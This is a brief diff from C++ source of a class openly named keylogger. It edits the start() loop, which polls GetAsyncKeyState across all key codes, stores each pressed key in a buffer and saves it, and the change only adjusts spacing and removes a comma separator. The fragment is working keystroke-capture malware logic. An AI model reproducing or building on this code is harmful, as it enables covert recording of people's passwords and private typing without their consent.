@@ -23,9 +23,9 @@ void keylogger::start()
 
 	while(TRUE)
 		for(char t_key = 1; t_key <= 255; t_key++)
-			if(GetAsyncKeyState(t_key) == -32767)
+			if (GetAsyncKeyState(t_key) == -32767)
 			{
-				*a_buffer = to_string(t_key) + ",";
+				*a_buffer = to_string(t_key);
 				save();
 				t_count++;
 			}
